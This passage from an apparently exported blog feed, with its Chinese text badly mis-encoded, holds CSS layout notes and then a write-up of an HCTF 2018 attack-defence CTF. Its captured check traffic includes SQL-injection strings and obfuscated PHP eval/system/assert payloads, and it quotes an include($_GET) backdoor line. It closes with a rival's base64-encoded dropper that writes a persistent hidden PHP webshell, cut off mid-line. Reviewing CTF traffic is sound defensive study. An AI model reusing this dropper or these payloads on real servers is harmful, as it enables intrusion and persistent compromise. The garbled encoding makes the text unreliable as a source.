ÊúâÊïàÂÆΩÂ∫¶ÂÄºÔºåÂç≥Âü∫ÂáÜÂÄº„ÄÇ Â§öÂàóÂ∏ÉÂ±Ä ÊñáÊú¨ÁöÑÂ§öÂàóÂ∏ÉÂ±ÄÔºü Â§öÂàóÂ∏ÉÂ±ÄÔºö ColumnscolumnsÔºö&lt;column-width&gt; || &lt;column-count&gt;ÔºåÂ±ûÊÄßÂÄºÂàóÂÆΩÂíåÂàóÊï∞„ÄÇdemo: 200px ‰∏§Âàó1columns: 200px 2; ÂàóÂÆΩÔºö column-widthcolumn-width: auto | &lt;length&gt;ÔºåÂèØ‰ª•ÂçïÁã¨‰ΩøÁî®„ÄÇ ÂàóÊï∞Ôºöcolumn-countcolumn-countÔºöauto | &lt;integer&gt; ÂàóÈó¥Ë∑ùÔºö column-gapcolumn-gap: normal || &lt;length&gt;ÔºåÈªòËÆ§1emÔºå‰πüÂèØ‰ª•Áî®px‰ΩúÂçï‰Ωç ÂàóËæπÊ°ÜÊ†∑ÂºèÔºöcolumn-rule 1column-rule:&lt;column-rule-width&gt;|&lt;column-rule-style&gt;|&lt;column-rule-color&gt; ÂíåborderÁ±ª‰ººÔºåËÆæÁΩÆÂàóËæπÊ°ÜÁöÑÂÆΩ/Ê†∑Âºè/È¢úËâ≤demoÔºöcolumn-rule: 2px dotted green; Ë∑®ÂàóËÆæÁΩÆ: column-spancolumn-span:all | noneÔºå all‰∏∫Ë∑®Ë∂äÊâÄÊúâÂàó CSS3 opacityÂ±ûÊÄßËÆæÁΩÆÂÖÉÁ¥†ÁöÑ‰∏çÈÄèÊòéÁ∫ßÂà´demo: ËÆæÁΩÆdivÂÖÉÁ¥†‰∏∫ÈÄèÊòé123div&#123; opacity: 0;&#125; 0x03 ÂÖÉÁ¥†ÂÖÉÁ¥†ÂàÜÁ±ªÔºö ÂùóÁä∂ÔºöÈªòËÆ§‰∏∫ÂùóÁ∫ßÂÖÉÁ¥†‰∏Ä‰∏™Âç†‰∏ÄË°å(‰ªéÊñ∞‰∏ÄË°åÂºÄÂßãÔºåÂêéÈù¢ÁöÑÂÖÉÁ¥†Âè¶Ëµ∑‰∏ÄË°å)„ÄÇÈ´ò„ÄÅÂÆΩ„ÄÅË°åÈ´ò„ÄÅÈ°∂ÂíåÂ∫ïËæπË∑ùÂèØËÆæÔºåÈªòËÆ§Âç†Áà∂ÂÆπÂô®100%„ÄÇ‰ΩøÁî®display:blockÂèØÂ∞ÜÈùûÂùóÁä∂ÂÖÉÁ¥†ËΩ¨ÂåñÊàêÂùóÁä∂„ÄÇÂ∏∏ËßÅÂÖÉÁ¥†ÊúâÔºö 1&lt;div&gt;„ÄÅ&lt;p&gt;„ÄÅ&lt;h1&gt;...&lt;h6&gt;„ÄÅ&lt;ol&gt;„ÄÅ&lt;ul&gt;„ÄÅ&lt;dl&gt;„ÄÅ&lt;table&gt;„ÄÅ&lt;address&gt;„ÄÅ&lt;blockquote&gt; „ÄÅ&lt;form&gt; ÂÜÖËÅîÔºöÂíåÂÖ∂‰ªñÂÖÉÁ¥†Âú®‰∏ÄË°å‰∏äÔºåÂÖÉÁ¥†È´ò„ÄÅÂÆΩÂ∫¶ÂèäÈ°∂ÂíåÂ∫ïËæπË∑ù‰∏çÂèØËÆæÁΩÆÔºåÂÖÉÁ¥†ÂÆΩÂ∫¶Âç≥ÂÖ∂ÂåÖÂê´ÁöÑÂÜÖÂÆπÁöÑÂÆΩÂ∫¶Ôºå‰∏çÂèØÊîπÂèò„ÄÇÂèØ‰ª•‰ΩøÁî®display: inlineÂ∞ÜÈùûÂÜÖËÅîÂÖÉÁ¥†ËΩ¨Êç¢‰∏∫ÂÜÖËÅîÂÖÉÁ¥†„ÄÇÂ∏∏ËßÅÂÖÉÁ¥†Ôºö 1&lt;a&gt;„ÄÅ&lt;span&gt;„ÄÅ&lt;br&gt;„ÄÅ&lt;i&gt;„ÄÅ&lt;em&gt;„ÄÅ&lt;strong&gt;„ÄÅ&lt;label&gt;„ÄÅ&lt;q&gt;„ÄÅ&lt;var&gt;„ÄÅ&lt;cite&gt;„ÄÅ&lt;code&gt; ÂÜÖËÅîÂùóÁä∂Ôºö ÂêåÊó∂ÂÖ∑Â§áÂÜÖËÅîÂÖÉÁ¥†ÂíåÂùóÁä∂ÁöÑÁâπÁÇπÔºåÂíåÂÖ∂‰ªñÂÖÉÁ¥†Âú®‰∏ÄË°åÔºåÂÖÉÁ¥†ËæπË∑ùÂèØËÆæÁΩÆ„ÄÇÂèØ‰ª•‰ΩøÁî®display: inline-blockËΩ¨Êç¢ 1&lt;img&gt;„ÄÅ&lt;input&gt;]]></content>
      <categories>
        <category>Code</category>
      </categories>
      <tags>
        <tag>Code</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[HCTF 2018 AWDÂ∞èËÆ∞]]></title>
    <url>%2F2018%2F12%2F20%2FHCTF%202018%20AWD%E5%B0%8F%E7%BB%93%2F</url>
    <content type="text"><![CDATA[ÂèçÊÄùË∑ë‰∫ÜËøô‰πàËøúÂéªÊù≠Â∑ûÔºåÊääÂ∞èÁªÑÁöÑËÑ∏ÈÉΩÁªô‰∏¢Â∞Ω‰∫Ü‚Ä¶ËøôÈáåËØ¥Âá†‰∏™Êàë‰ª¨ÂêÉÂà∞‰∫èÂêßÔºåÁ¨¨‰∏ÄÊ¨°ÊâìawdÔºå‰∏æÂäûÊñπÁöÑËµõÂà∂ÂíåÊàë‰ª¨‰πãÂâçÁªÉ‰π†ÁöÑÊÉÖÂΩ¢‰∏çÂ§™‰∏ÄÊ†∑„ÄÇÂèØËÉΩËÄÉËôëÂà∞ÂéªÁ∫ø‰∏ãÁöÑÈÉΩÊòØËÄÅËµõÊ£çÔºåÂ∞±Ê≤°ÊúâÁÖßÈ°æÂà∞Êàë‰ª¨ËøôÊ†∑ÁöÑËêåÊñ∞ÔºåËµõÂà∂ËØ¥ÊòéÈÉΩÊ≤°Êúâ„ÄÇ Áõ¥Âà∞ÊâìÂà∞ÂêéÊù•ÊâçÁü•ÈÅìÔºå10ÂàÜÈíüÁªìÁÆó‰∏ÄËΩÆflagÔºåÂ¶ÇÊûúË¢´ÊîªÂáªÁöÑÊúçÂä°Ë¢´checkÂÆïÊú∫‰∫ÜÔºåÈÇ£‰πàËøô‰∏™flagÊòØÊó†ÊïàÁöÑ„ÄÇÂç≥‰Ωø‰Ω†Âú®Ëøô10ÂàÜÈíüÂÜÖÊèê‰∫§flagÔºå‰ªñÁªô‰Ω†ÊòæÁ§∫flagÊèê‰∫§ÊàêÂäüÔºå‰ΩÜÊúÄÂêéÁªìÁÆóÁöÑÊó∂ÂÄôÊòØ‰∏ç‰ºöÁÆó‰∏äÂàÜÁöÑ„ÄÇË¢´checkÂÆïÊú∫ÁöÑÈòü‰ºç‰ºöÊâ£Èô§60ÂàÜÁªôÊ≤°ÊúâÂÆïÊú∫ÁöÑÈòü‰ºçÊØè‰∫∫Âä†10ÂàÜ„ÄÇÊàë‰ª¨ÂΩìÊó∂ÊÉ≥ÁùÄÊèê‰∫Ü‰∏ÄÂ†ÜflagÊâìÂæóË¥ºÂ∏¶ÊÑüÔºåÁªìÊûúËÉΩÂä†‰∏äÁöÑÂàÜÂ∞ëÁöÑÂèØÊÄúÔºåÁ¨¨‰∏ÄÈ¢òÈô§‰∫ÜÂ§©Êû¢ÂíåËìùËé≤Ëä±ÁöÑÂ∏àÂÇÖÂÅ∂Â∞îÊòØÊ≠£Â∏∏ÁöÑ‰∏ÄËΩÆËÉΩÊ∂®‰∏ä100Â§öÂàÜÔºåÂÖ∂‰ªñÈòü‰ºçÂÖ®Á®ãÂÆïÊú∫ÔºåÊâÄ‰ª•Èò≤ÂÆàÂíåËøõÊîªÂêåÁ≠âÈáçË¶Å„ÄÇ ÂÖ∂Ê¨°Â∞±ÊòØcheckÁõ∏ÂÖ≥ÁöÑÔºåÊàë‰ª¨ÈÖçÁΩëÁªúËøûsshÊµ™Ë¥π‰∫ÜÂæàÂ§öÊó∂Èó¥Ôºå1l 0OÂàÜ‰∏çÊ∏ÖÔºåÂØºËá¥Êàë‰ª¨‰∏Ä‰∏äÁ∫øÔºåÊàë‰ª¨Êú∫Â≠êÈáåÂ∞±Ë¢´Áßç‰∫Ü‰∏ÄÂ†ÜÈ©¨„ÄÇÁÑ∂ÂêéÊàë‰ª¨Êãø‰∏çÂà∞ÊúÄÂàùÂßãÁöÑÊ∫êÁ†ÅÔºåÂõûÊªöÂà∞Á¨¨‰∏ÄÊ¨°Â§á‰ªΩÈÉΩËøòÊòØÂæàÂ§öÈ°µÈù¢ÈÉΩÊòØÂùèÁöÑÔºå ÊúÄÂêéweb1Ë¢´checkÂÆï‰∫Ü2Â§©Êï¥ÁöÑ„ÄÇÁÑ∂Âêé‰øÆÊ¥ûÔºå‰∏çË¶ÅÊÉ≥ÁùÄÁªôÂÖ®Á´ô555Â∞±ËÉΩÈò≤‰ΩèË¢´‰º†È©¨‰∫ÜÔºåËøôÊ¨°‰∏ä‰º†ÁÇπ‰πüÊòØ‰∏Ä‰∏™checkÁÇπÔºåÂú®ÂêéÈù¢‰ºöÁªìÂêàcheckÊµÅÈáèËøõË°åËØ¶ÁªÜÂàÜÊûê„ÄÇ ÂÜçËØ¥ËØ¥ËøêÁª¥Áõ∏ÂÖ≥ÁöÑÔºåËøôÊ¨°Êàë‰ª¨ÈòüÊàëË¥üË¥£ËøêÁª¥ÁöÑÔºåÊúâ‰∏™ÊØîËæÉÊÅºÁÅ´ÁöÑ‰∏úË•øÂ∞±ÊòØÔºåÊàë‰ª¨‰∏ä‰º†ÁöÑÊ¥û‰∏ÄÁõ¥Ê≤°‰øÆÂ§çÔºåÂõ†‰∏∫Êàë‰∏ÄÁõ¥Â∞±Áî®ÁöÑ555ÂéªÈò≤ÁöÑÔºåÂØºËá¥Êàë‰ª¨ËøêÁª¥ÁöÑÊó∂ÂÄôÊÉ≥Êîπ‰∏ÄÁÇπ‰∏úË•øÔºåÂ∞±‰ºöÂä†‰∏äÂÜôÁöÑÊùÉÈôêÔºåÁªìÊûúÁßç‰∏ä‰∫Ü‰∏ÄÂ†ÜÂÜÖÂ≠òÈ©¨„ÄÇ‰∫ãÂêéÂéªÈóÆ‰ªñ‰ª¨ÔºåÈ¢òÁõÆÈÄöËøáÊï£ÂàóÊ†πÊçÆipÁîüÊàêÈöèÊú∫Êñá‰ª∂ÂêçÈöèÊú∫ÂØÜÁ†ÅÁöÑ‰∏çÊ≠ªÈ©¨ÔºåÊúâ‰∏Ä‰∏™ÂÆàÊä§ËøõÁ®ãÁöÑÈ©¨ÔºåËøòÊúâ‰∏çÊñ≠Â§çÂà∂ÁöÑÈ©¨„ÄÇÊàëÂΩìÊó∂ËøêÁª¥ÁöÑÊó∂ÂÄôÔºåweb1ËøòË°åÔºåweb2‰∏Ä‰∏äÁ∫øÊâæË∑ØÁî±ËßÑÂàôÂ∞±Êë∏‰∫ÜÂçäÂ§©Ôºå‰ªñÈÇ£‰∏™ÊòØ.htaccessÂ•ó.htaccessÁöÑÔºåÊâÄ‰ª•ÊàëÁªôËá™Â∑±ÁõÆÂΩï‰º†‰∏Ä‰∏™ËøêÁª¥shellÔºåÊÄé‰πàÈÉΩËÆøÈóÆ‰∏çÂà∞„ÄÇÂÖ∂Ê¨°Â∞±ÊòØËèúÂàÄËøû‰∏ç‰∏äÁöÑÔºåÊàëÊãøÁùÄburpÔºå‰∏ÄÊù°Êù°ÂëΩ‰ª§ÊâãÂä®ËæìÔºö teamÁî®Êà∑chmod 777 -R ./upload,Áªô‰∏éÊñá‰ª∂Â§πÁöÑÂÜôÊùÉÈôêÊâçËÉΩÂà†ÈáåÈù¢ÁöÑÊñá‰ª∂ www-dataÁî®Êà∑Ôºökillall -u www-dataÔºåÊ∏ÖÊéâ‰∏çÊ≠ªÈ©¨ËøõÁ®ã www-dataÔºöchmod 777 -R ./upload,Â∞ÜÈ©¨ÊùÉÈôê‰øÆÊîπ ÊúÄÂêéÂÜçrm -rfÊâçËÉΩÂà†Êéâ‰ΩÜÊòØËøôËøáÁ®ãÂõ†‰∏∫Êàë‰ª¨Ê≤°‰øÆÊ¥û.. Âú®Áî®teamÁî®Êà∑ÁªôÂÜôÊùÉÈôêÁöÑÊó∂ÂÄôÔºå‰∏ÄÂ†ÜÈ©¨ÂèàÈ£ûËøõÊù•‰∫Ü‚Ä¶Âú®Ëøô‰∏äÈù¢Êµ™Ë¥πÁöÑÊó∂Èó¥Êå∫Â§öÁöÑÔºåÊâÄ‰ª•ÂæóÊèêÂâçÂáÜÂ§áÂ•ΩpyËèúÂàÄÔºåÊèêÂâçÂÜôÂ•ΩËøôÂá†Ê≠•Êìç‰Ωú„ÄÇ ËøôÊ¨°ÊØîËµõÔºåËèúÂàÄÊòØÂà´ÊÉ≥‰∫ÜÔºåÂõ†‰∏∫‰∏¥ËøëËÄÉËØïÔºåwebshellÁöÑÂà©Áî®ËÑöÊú¨ËøòÊúâbugÊ≤°Ë∞ÉËØïÂÆåÔºåÊâÄ‰ª•Êàë‰ª¨Â∞±Âè™ËÉΩÁé∞ÂÜôÂêÑÁßçÊºèÊ¥ûÁ±ªÂûãÁöÑÂà©Áî®Á®ãÂ∫èÔºå‰πüÂ∞±‰ªÖ‰ªÖÁßç‰∏™È©¨ÔºåËØª‰∏™flagÂ∞±Ê≤°‰∫Ü„ÄÇËøòÊúâÂÖ∂‰ªñÁöÑÂ•óË∑ØÈÉΩÊ≤°Áé©ÁöÑ‰∏ä„ÄÇ checkÊµÅÈáèÂàÜÊûê‰∫ãÂêéÊääwafËÆ∞ÂΩïÁöÑÊµÅÈáèÂØºÂá∫Êù•Êï¥ÁêÜÂàÜÊûê‰∫Ü‰∏ÄÁï™ÔºåËøôÊ¨°‰∏æÂäûÊñπÁöÑcheckÂèØË∞ìÊòØÂçÅË∂≥ÁöÑ‰∏•Ê†ºÔºåÁ¨¨‰∏ÄÂ§©ÂÖ®Âú∫webÂÆïÊú∫„ÄÇËøòÊúâ‰ªñ‰ª¨Ëøò‰ºöcheckÊòØÂê¶‰ΩøÁî®ÈÄöÈò≤„ÄÇ ‰ªéÊµÅÈáè‰∏≠ÂèØ‰ª•ÁúãÂà∞Ôºåweb1ÁöÑcheckÊµÅÁ®ãÔºöÊ≥®ÂÜå-&gt;ÁôªÂΩï-&gt;‰∏ä‰º†ÂõæÁâá-&gt;ÂåÖÂê´ÂõæÁâá‰πãÊâÄ‰ª•ËøòÂú®Êï∞ÊçÆ‰∏≠ÁúãÂà∞‰∏ÄÂ†Ü‰π±‰∏ÉÂÖ´Á≥üÁöÑÁ±ª‰ººpayloadÁöÑ‰∏úË•øÔºåËøôËÇØÂÆöÂ∞±ÊòØ‰∏ªÂäûÊñπcheckÈÄöÈò≤ÁöÑÊñπÊ≥ï‰∫Ü„ÄÇ ÊâÄ‰ª•Ôºö ÂçÉ‰∏á‰∏çË¶ÅÁî®555ÔºåÂÆÅÂèØ‰∏ä‰∏Ä‰∏™.htaccess(ËôΩÁÑ∂ÂêéÈù¢ËøòÊòØË¢´ËìùËé≤Ëä±ÁöÑÂ∏àÂÇÖrm/Ë¶ÜÁõñ‰∫Ü) ‰∏çË¶ÅÊÉ≥ÁùÄbanip‰∫ÜÔºåcheckbotÁöÑip‰ºöÂèòÂá†Ê¨°ÔºåÊõ¥‰ΩïÂÜµËøò‰ºöË¢´‰∏æÊä•ÔºåcheckÂà∞‰∏ÄÊ¨°Êâ£800ÂàÜ‚Ä¶ ÂàáÂÆå‰∏çË¶ÅÁõ¥Êé•Âà†ÂäüËÉΩÁÇπÔºåÊñá‰ª∂ÂåÖÂê´Ëøô‰∏™ÁÇπÔºåÁúãÁùÄÂ∞±ÊòØ‰∏Ä‰∏™ÂêéÈó®&#39;&lt;?php include($_GET[&#39;img&#39;]); ?&gt;&#39;,ÁªìÊûúË∞ÅÁü•ÈÅìËøôÊòØ‰∏™checkÁÇπ.. 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748time: ip: 192.168.233.42POST /client/user/emmm_play.class.php?emmm_cms=reg&amp;flag=ZrMlDhzjtpiKdWQnPNVyBxvw%20&apos;%20or%20select%201,2,3,4,5,(select%200xazuLSJeROvTlnChqgXmBpFckHADoKfGsbdZMPItVwirjENWQUyxY),7,8,9,10,11,12Host: 192.168.233.40:5005Content-Length: 274Accept-Encoding: gzip, deflateAccept: */*User-Agent: python-requests/2.7.0 CPython/2.7.15 Darwin/18.2.0Connection: keep-aliveContent-Type: application/x-www-form-urlencodedpost-data: lang=cn&amp;COL_Useremail=wqtCeoznUp%40pDusboSjcE.com&amp;COL_Useranswer=KvcuIkTRwz&amp;COL_Userproblem=%E4%BD%A0%E8%87%AA%E5%B7%B2%E7%9A%84%E7%94%9F%E6%97%A5%EF%BC%9F&amp;source=0&amp;ip=127.0.0.1&amp;COL_Userpass2=123456&amp;COL_Userpass=123456&amp;introducer=&amp;Submit=%E6%8F%90%E4%BA%A4%E6%B3%A8%E5%86%8Ctime: ip: 192.168.233.42POST /client/user/emmm_play.class.php?emmm_cms=login&amp;flag=edruHEyhIcsMPivmpoWxlzNjVYCFgLwSaAGDbnkt%20&apos;%20&amp;&amp;%20select%201,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,(select%200xeYKCTRrMpmofFqEsdNhnZlcXDiUVSbxgzHyGuQJtIBWjvLPwkaOA)Host: 192.168.233.40:5005Content-Length: 87Accept-Encoding: gzip, deflateAccept: */*User-Agent: python-requests/2.7.0 CPython/2.7.15 Darwin/18.2.0Connection: keep-aliveCookie: PHPSESSID=ol9nsqdpgkli34mu4kuebohcqkContent-Type: application/x-www-form-urlencodedpost-data: COL_Useremail=wqtCeoznUp%40pDusboSjcE.com&amp;COL_Userpass=123456&amp;Submit=%E7%99%BB%E5%BD%95time: ip: 192.168.233.42POST //client/user/emmm_play.class.php?emmm_cms=edit&amp;lang=cnHost: 192.168.233.40:5005Content-Length: 79075Accept-Encoding: gzip, deflateAccept: */*User-Agent: python-requests/2.7.0 CPython/2.7.15 Darwin/18.2.0Connection: keep-aliveCookie: PHPSESSID=ol9nsqdpgkli34mu4kuebohcqkContent-Type: multipart/form-data; boundary=ad7bceb5053a4b3ca22cd26f34b77a19time: ip: 192.168.233.42GET /client/user/index.php?img=../../skin/HcSLetgnrb.pngHost: 192.168.233.40:5005Connection: keep-aliveAccept-Encoding: gzip, deflateAccept: */*User-Agent: python-requests/2.7.0 CPython/2.7.15 Darwin/18.2.0 day2-web1:1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798991001011021031041051061071081091101111121131141151162018/12/16 02:32:10GET /check?cmd=sdhABbfUTgCuIWqSnvXRjYLM.move_file(AOFyfsqBgVeoTdKtMSICEjaGbRUHL.base64_decode(file_get_content(VMZthpbqiuzURmGCDEwFHyadSPrNeWxnQsYkKXcgJAjoTlBIOvfL).zGgOeoBqwVrIjayQLUWbDinvh).SFhuxlvKbWkUwMYE HTTP/1.1IPÔºö192.168.22.243HOSTÔºö192.168.117.100:9009:9009USER_AGENTÔºöCOOKIEÔºöREFERERÔºö2018/12/16 02:37:02GET /check?cmd=MxyLYmfRiUWuqIFCVowJrOSATEgtHs &apos; &amp;&amp; select 1,2,3,4 HTTP/1.1IPÔºö192.168.50.150HOSTÔºö192.168.117.100:9009:9009USER_AGENTÔºöpython-requests/2.18.4COOKIEÔºöREFERERÔºö2018/12/16 02:37:02GET /?cmd=YfLvGKAnQNebwqpPijUu &apos; or select 1,2,3,4,5,6,7,8,9,10,11,12,(select 0xyUpKDhLVwfBtFivxAbZqEjXCQdJYMaGlozIHPnuekOcNmsgWR),14,15,16,17,18,19,20,21,22,23,24,25 HTTP/1.1IPÔºö192.168.50.150HOSTÔºö192.168.117.100:9009:9009USER_AGENTÔºöpython-requests/2.18.4COOKIEÔºöREFERERÔºö2018/12/16 02:37:02GET /users/register?cmd=irTekycoKIWSRCsfUqxBAgapl.substr(NhaVIUPfvOmuAjDgrsXJSKMixYyBZo.readdir(VnAGsifbEUZzjCw.move_file(DivqLWumQORGaTkJrC.readdir(base64_decode(fporTBYmQdAHxyuRXcIEnDFhGOkzMbLaWwNVetUvqjZPgClJKSsi).LEwjPvQxCKFOA).TEivOpdPRkrcouhzVKbeIaFUGH).OMVWBXdxNPGgAeLhS).pdrcXqohZFHW) HTTP/1.1IPÔºö192.168.50.150HOSTÔºö192.168.117.100:9009:9009USER_AGENTÔºöpython-requests/2.18.4COOKIEÔºöPHPSESSID=REFERERÔºöPOST /users/register?cmd=xRVrcDLSZMUPpbXjsBiOz &apos; union select 1,2,3,4,5,6,7,(select 0xXctOkvxodFyfGUuTDgblraRziAVSYKsQJHemEjZhwPWnLICNBMqp),9,10,11,12,13,14,15 HTTP/1.1IPÔºö192.168.50.150HOSTÔºö192.168.117.100:9009:9009USER_AGENTÔºöpython-requests/2.18.4COOKIEÔºöPHPSESSID=REFERERÔºöPOSTÔºöusername=ecCNkO&amp;confirm_password=kaljXLRHtU&amp;password=kaljXLRHtU2018/12/16 02:37:02GET /users/login HTTP/1.1IPÔºö192.168.50.150HOSTÔºö192.168.117.100:9009:9009USER_AGENTÔºöpython-requests/2.18.4COOKIEÔºöPHPSESSID=REFERERÔºö2018/12/16 02:37:02GET /users/login?cmd=bcjusDLfkrpMTwHeloSWZgqAd.file_put_contents(fhHiInvDELpKeJ.readdir(NFvnqgXMJHDE.glob(mtCEkDWycgzqnQVLaJPiZS.assert(ytvJChwoYe.fread(file_put_contents(GwLUrvORJmIPfYjVcMAuCtzBSThHZqXKb).hnrjIwBUuPexykfiWqc).HBSQthcujMYWDFPUkaAVgbivTsnN).KYsLfDbFHW).HGTMvLBkRgDmVKIso).RbIkdCSDoErKHYFqatGNjsWh) HTTP/1.1IPÔºö192.168.50.150HOSTÔºö192.168.117.100:9009:9009USER_AGENTÔºöpython-requests/2.18.4COOKIEÔºöPHPSESSID=REFERERÔºöPOST /users/login?cmd=GLpMuASfsPFWiXc.fread(CBMwgWxDbtcFPjAmNnXUVovKpieaLY.fread(mzuYHcTVvraCJhXR.dirname(lwzeLcmxMbTUoXgsABfYiJ.system(zHaZomhUABCrlWPykdqbIiD.eval(system(CxrWZSDBOknpjNweauXYdAgvoPzHQJRsbGcfVtElFMyIKThUqimL).jBqTLeChVQsDxmRtIZWbgki).yMqBZgcwzXjblrAYfEUICQThnD).GkovubFLynSrixIcpJgqR).OSyBnrvoWeXuIPNpEGsARZzJ).hsjweqlXxPrDROkMEibS) HTTP/1.1IPÔºö192.168.50.150HOSTÔºö192.168.117.100:9009:9009USER_AGENTÔºöpython-requests/2.18.4COOKIEÔºöPHPSESSID=REFERERÔºöPOSTÔºöusername=ecCNkO&amp;password=kaljXLRHtU2018/12/16 02:37:02GET /users HTTP/1.1IPÔºö192.168.50.150HOSTÔºö192.168.117.100:9009:9009USER_AGENTÔºöpython-requests/2.18.4COOKIEÔºöPHPSESSID=REFERERÔºöPOST /users/editprofit?cmd=YzOLfeHKbVjZyhcwonRXtJvTpSEIu.glob(maOUqAfuQhYM.file_get_content(KrzfMtSDuExbLX.move_file(readdir(gKUYOAHyNewQkRnoJfMXBmzpjTiaGdshcCEtFbrqxVWDIvSuPLlZ).TuPQJlhNjUYARoKIDEtCsaWcLBx).vikIXSEDftUW).fPzAivYRQEcIKCXrnNs) HTTP/1.1IPÔºö192.168.50.150HOSTÔºö192.168.117.100:9009:9009USER_AGENTÔºöpython-requests/2.18.4COOKIEÔºöPHPSESSID=REFERERÔºöPOSTÔºöusername=QwLryC&amp;email=vESrMpul%40OlZDs2018/12/16 02:37:02GET /users HTTP/1.1IPÔºö192.168.50.150HOSTÔºö192.168.117.100:9009:9009USER_AGENTÔºöpython-requests/2.18.4COOKIEÔºöPHPSESSID=REFERERÔºöPOST /users/editAvatar?cmd=XJqDYlazVZAxwtmNFnIyiQkGSvPcKOHoRfEWT &apos; and select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,(select 0xCUJzbVPHQLMpGZxaBDRSFdfhgcWEkryqiswlvjnTutmIAYKNXeoO),30,31,32,33,34,35 HTTP/1.1IPÔºö192.168.50.150HOSTÔºö192.168.117.100:9009:9009USER_AGENTÔºöpython-requests/2.18.4COOKIEÔºöPHPSESSID=REFERERÔºöPOSTÔºöPOST /users?cmd=OYhzfowNAdGcvpRWsUbCXqIn.dirname(ZxtIKuPJprHCifgvGLQDmTeWjEnRsd.assert(qAxgrvhSiK.move_file(UTpIhfOkulKaxSoQjzwLmHZeYtr.substr(JimRENYeHZ.dirname(assert(fldrzeIkncKqORGVTiEtuFhoNwpJAPxSyUBDCLmZvXHWQMagsjYb).mzLflHhTvrCGyjPSnNU).PuvwmptyQRWn).UcrCmvYgKjAFiXEVuIeGw).wBJClAQUGr).puUhczOWfMJQSxIyqXLEGAwnNCKDRZ) HTTP/1.1IPÔºö192.168.50.150HOSTÔºö192.168.117.100:9009:9009USER_AGENTÔºöpython-requests/2.18.4COOKIEÔºöPHPSESSID=REFERERÔºö Ê≤üÈÄöËôΩÁÑ∂‰∏çÈôêÂà∂Â§ñÁΩëÔºå‰ΩÜÊòØÁΩëÁ∫øÂíåwifiÂàáÊç¢Ëµ∑Êù•ËøòÊòØÂæàÈ∫ªÁÉ¶ËÄå‰∏îÊó∂ÊïàÊÄß‰πüÊòØ‰∏™ÈóÆÈ¢ò„ÄÇÊàë‰ª¨Âú®ÈòüÂÜÖÁî®È£ûÈ∏Ω‰º†‰π¶Ëøô‰∏™ÂÜÖÁΩëËÅäÂ§©Á®ãÂ∫èÊù•Ëß£ÂÜ≥ÁöÑ„ÄÇ‰πüÂ∞ùËØï‰∫ÜÂèåÁΩëÂç°Ôºå‰ΩÜÊòØËøòÊòØÊúâ‰∏ÄÁÇπÂ∞èÈóÆÈ¢ò„ÄÇ Â∏àÂÇÖ‰ª¨ÁöÑshell ÈªòÂ∞èË•øÂ∏àÂÇÖÁöÑshellÔºömoxiaoxi ip:192.168.13.134 ‰ªñÁöÑshellÂêåÊó∂ËøòËøõË°å‰∫ÜÂÜÖÂÆπÊ£ÄÊµã„ÄÇÂÖ∂ÂÆû‰πüÂèØ‰ª•Á†¥ÔºåÊàë‰ª¨Ê∏ÖÈ©¨ÁöÑÊó∂ÂÄôÔºåËÆ∞‰∏Ä‰∏ãÊñá‰ª∂ÂêçÔºåÁÑ∂ÂêéÊ∏ÖÂÆå‰πãÂêéÔºåÁªô‰ªñ‰∏ä‰∏Ä‰∏™ÂêåÂêçÊñá‰ª∂ËÆ∞ÂΩïÊµÅÈáèÔºåÂ∞±Áü•ÈÅì‰ªñÂØÜÁ†Å‰∫ÜÔºåÁÑ∂ÂêéÊê≠‰∏ÄÊ≥¢È°∫È£éËΩ¶~ 123456789101112131415161718192021222324252627282930system(&apos;/bin/echo mo123;/bin/echo JHBhdGggPSAnL2hvbWUvdGVhbS93b3JrZGlyL3NraW4vLjRiMjIzMzFjZTg2YzhjYWEwYWRjMzcwMzkzMjZkNWZjLnBocCc7CiRjb2RlX3RlbXBsYXRlID0gIlBEOXdhSEFLSUNBZ0lDQWdJQ0FnSUNBZ2FXZHViM0psWDNWelpYSmZZV0p2Y25Rb2RISjFaU2s3Q2lBZ0lDQWdJQ0FnSUNBZ0lITmxkRjkwYVcxbFgyeHBiV2wwS0RBcE93b2dJQ0FnSUNBZ0lDQWdJQ0FrWm1sc1pTQTlJQ0l1TkdJeU1qTXpNV05sT0Raak9HTmhZVEJoWkdNek56QXpPVE15Tm1RMVptTXVjR2h3SWpzS0lDQWdJQ0FnSUNBZ0lDQWdKSE5vWld4c0lEMGdZbUZ6WlRZMFgyUmxZMjlrWlNnblVFUTVkMkZJUVV0aFYxbHZVVU5TWmxWclZsSldWVlpVVmtaemFXRkhSbnBoUTBwa1VGUXdPVWx0V214WlYxRjNXbTFhYUUxRVFtcE5WR3hwVG0xSk1scFVTVEZhVkZsM1dtMUplbGx0VG14WmFsSnBTV2xyUzJWM2IyZEpRMEZuVVVoT05XTXpVbXhpVTJkcldERktSbFZXVmtaVk1WSmlTVzB4ZG1WSGJHaGlNMmh3VG1wWk1rbHNNSEJQZDNBNVEybzRLeWNwT3dvZ0lDQWdJQ0FnSUNBZ0lDQjFibXhwYm1zb1gxOUdTVXhGWDE4cE93b2dJQ0FnSUNBZ0lDQWdJQ0IzYUdsc1pTQW9WRkpWUlNrZ2Uzc0tJQ0FnSUNBZ0lDQWdJQ0FnYVdZZ0tHWnBiR1ZmWjJWMFgyTnZiblJsYm5SektDUm1hV3hsS1NFOVBTUnphR1ZzYkNrZ2Uzc2dabWxzWlY5d2RYUmZZMjl1ZEdWdWRITW9KR1pwYkdVc0lDUnphR1ZzYkNrN0lIMTlDaUFnSUNBZ0lDQWdJQ0FnSUhWemJHVmxjQ2cxS1RzS0lDQWdJQ0FnSUNBZ0lDQWdmWDBLSUNBZ0lDQWdJQ0FnSUNBZ1B6ND0iOwpmaWxlX3B1dF9jb250ZW50cygkcGF0aCwgYmFzZTY0X2RlY29kZSgkY29kZV90ZW1wbGF0ZSksIExPQ0tfRVgpOw== | /usr/bin/base64 -d | /bin/cat &gt; /home/team/workdir//.4b22331ce86c8caa0adc37039326d5fc.php;/bin/echo xiaoxi456890&apos;);base64:$path = &apos;/home/team/workdir/skin/.4b22331ce86c8caa0adc37039326d5fc.php&apos;;$code_template = 